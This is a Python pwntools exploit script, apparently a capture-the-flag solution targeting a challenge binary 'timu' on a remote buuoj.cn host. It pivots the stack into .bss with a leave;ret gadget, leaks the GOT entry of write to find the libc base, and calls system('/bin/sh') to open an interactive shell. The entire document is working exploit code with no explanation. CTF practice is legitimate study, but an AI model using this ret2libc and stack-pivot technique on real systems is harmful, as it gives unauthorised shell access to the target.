from pwn import *
context.log_level="debug"

sh=process("./timu")
sh=remote("node5.buuoj.cn",29008)
elf=ELF("./timu")
#libc=ELF("/lib/i386-linux-gnu/libc.so.6")
libc=ELF("./libc-2.23.so")

puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
write_plt=elf.plt["write"]
write_got=elf.got["write"]
main=0x08048513
bss=0x0804A300
leave_ret=0x08048408

payload=p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)
sh.recvuntil(b"What is your name?")
sh.send(payload)
payload1=0x18*b'a'+p32(bss-0x4)+p32(leave_ret)
sh.recvuntil(b"What do you want to say?")
sh.send(payload1)
#print("recv=",sh.recv())
write_addr=u32(sh.recv(4))
print("write_addr=",write_addr)
libc_base=write_addr-libc.sym["write"]
print("libc_base=",hex(libc_base))
system_addr=libc_base+libc.sym["system"]
binsh=libc_base+next(libc.search(b"/bin/sh"))

payload2=p32(system_addr)+p32(0)+p32(binsh)
sh.recvuntil(b"What is your name?")
sh.send(payload2)
payload3=0x18*b'a'+p32(bss-0x4)+p32(leave_ret)
sh.recvuntil(b"What do you want to say?")
sh.sendline(payload3)
sh.interactive()
